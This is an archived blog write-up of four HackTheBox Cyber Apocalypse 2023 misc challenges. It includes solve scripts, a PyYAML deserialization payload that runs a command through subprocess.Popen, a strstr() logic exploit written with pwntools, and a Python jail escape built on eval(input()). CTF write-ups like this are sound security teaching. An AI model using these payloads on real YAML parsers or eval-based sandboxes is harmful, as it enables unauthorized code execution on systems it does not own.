# ⛓️ 

> **Original Source:** [](https://medium.com/@fracchetto1995/htb-cyber-apocalypse-2023-misc-writeup-e4385a62a78f)
> **Platform:** medium.com | **Category:** `BLOCKCHAIN` | **Event:** HackTheBox CTF | **Year:** 2023


---

## 📝 Full Writeup

HTB Cyber Apocalypse 2023 (Misc Writeup)[![Apothiphis_z](https://web.archive.org/web/20251126143525im_/https://miro.medium.com/v2/da:true/resize:fill:64:64/0*ZwuZ-RXusa_9UWC3)

](/web/20251126143525/https://medium.com/@fracchetto1995?source=post_page---byline--e4385a62a78f---------------------------------------)

[Apothiphis_z](/web/20251126143525/https://medium.com/@fracchetto1995?source=post_page---byline--e4385a62a78f---------------------------------------)

·
Mar 24, 2023

[

](/web/20251126143525/https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fe4385a62a78f&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40fracchetto1995%2Fhtb-cyber-apocalypse-2023-misc-writeup-e4385a62a78f&user=Apothiphis_z&userId=e2b41f5045e7&source=---header_actions--e4385a62a78f---------------------clap_footer------------------)

--



So Cyber Apocalypse 2023 just ended and me and my teammates made a good performance solving lots of challenges. My favourite were Hijack and Nehebkaus Trap, which I’ll discuss later in the writeup.

Let’s start with persistence a very-easy misc. The Description is self explanatory : “GET request to /flag” and “Legends say it works once every 1000 tries.” where my starting point

That’s the script I used to solve it:

```
import requests
import time
ip= "http://{ip}:{port}/flag"
for i in range(1200): #more than 1000 requests (just in case!)
 r = requests.get(ip) #get request
 data = r.content
 print(data)
 if b"HTB{" in data:
 time.sleep(1000) # just to see the flag
```

Executing it, after some time, will give us the flag: 
HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}

####

Hijack:

For this chal I’ve used [https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://web.archive.org/web/20251126143525/https://github.com/j0lt-github/python-deserialization-attack-payload-generator) , but slow down how I got to this point? I first run the program and tried to make a new configuration

It gives us a base64 string let’s decode it with cyberchef:

So it seems a yaml object so I have literally searched yaml vulnerability and the first result is Yaml Deserialization. Searching on github I’ve used this [link](https://web.archive.org/web/20251126143525/https://github.com/j0lt-github/python-deserialization-attack-payload-generator). Run the program and insert cat flag.txt it will give us a yaml object like this:

```
!!python/object/apply:subprocess.Popen
- !!python/tuple
 - cat
 - flag.txt
```

HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}
####

Janken

When I first saw this challenge I knew that will be flagged, why you ask well this challenge was similar to one that John Hammond shown in one of his video, the vulnerable function is strstr() and we will exploit it to get the flag. Our task is to win 100 times in rock-paper-scissor how can we do it not knowing what the opponent plays? Well we will send rockscissorspaper ! Here is the solve script:

```
from pwn import *
from time import sleep
#context.log_level = "debug"
ip, port = "209.97.134.50",31488
elf = ELF("janken")
win = "rockscissorspaper"
r = remote(ip, port)
r.sendline("1")
for i in range(100):
 print(i,"\n")
 r.sendline(win)
 time.sleep(1)
 data = r.recv(124)
 print(data,"\n")
r.interactive()
```

And the flag is: HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}

####

Nehebkaus Trap

This is a python sandbox escape challenge, it was my first time solving something like this (So expect to be a sandbox escape challenge on the next ctf made by Hackappatoi)

The requirements are: 
-be creative
-know some python

First we should know banned functions

banned function and ones we can use
We will also see the banned chars:

```
> print(globals())

[*] Input accepted!

{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f48d8813c10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/./jail.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'time': <module 'time' (built-in)>, 'BLACKLIST': ('.', '_', '/', '"', ';', ' ', "'", ','), 'Color': <class '__main__.Color'>, '_print': <function _print at 0x7f48d886fd90>, 'banner': <function banner at 0x7f48d87aec20>, 'loop': <function loop at 0x7f48d87aecb0>, '_': 3}
```

How can we escape from it? we can use eval() print() and input(), input() is our savior because there we can use the blacklisted chars. For example let’s read the source code: we will use

#

> print(eval(input()))

[*] Input accepted!

open(__file__,”r”).read()

#

Here is the source code:

```
#!/usr/bin/env python3
import sys
import time

BLACKLIST = ('.', '_', '/', '"', ';', ' ', "'", ',')

class Color:
 WHITE = '\033[37m'
 RED = '\033[31m'
 BLUE = '\033[94m'
 GREEN = '\033[92m'
 BOLD = '\033[1m'

def _print(s):
 for c in list(s):
 sys.stdout.write(c)
 sys.stdout.flush()
 time.sleep(0.015)

def banner():
 print(f'{Color.RED}{Color.BOLD}'
 ' __\n'
 ' {00}\n'
 ' \__/\n'
 ' /^/\n'
 ' ( (\n' 
 ' \_\_____\n'
 ' (_______)\n'
 ' (_________()Ooo.')

 _print(f'{Color.BLUE}\n'
 "[ Nehebkau's Trap ]\n"
 f'{Color.WHITE}\n'
 'You are trapped!\n'
 'Can you escape?\n')

def loop():
 inp = input('> ')
 banned = [c for c in BLACKLIST if c in inp]
 if len(banned):
 print(f'\n{Color.RED}[!] Blacklisted character(s): {banned}{Color.WHITE}\n')
 return
 print('\n[*] Input accepted!\n')
 try: eval(inp)
 except Exception as e: print(f'Error: {e}\n')

if __name__ == '__main__':
 banner()
 for _ in range(10): loop()
 print(f'{Color.RED}[!] The walls crush you!')
```

Well we can use os.system(“cat flag.txt”) to get the flag, but we don’t have imported the os library no problemo!

HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}
Here are the challenges (misc) I’ve solved during the Htb ctf!!!

---

*📖 Originally published on [Medium](https://medium.com/@fracchetto1995/htb-cyber-apocalypse-2023-misc-writeup-e4385a62a78f). All credit goes to the original author.*
*📂 Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of blockchain CTF writeups.*
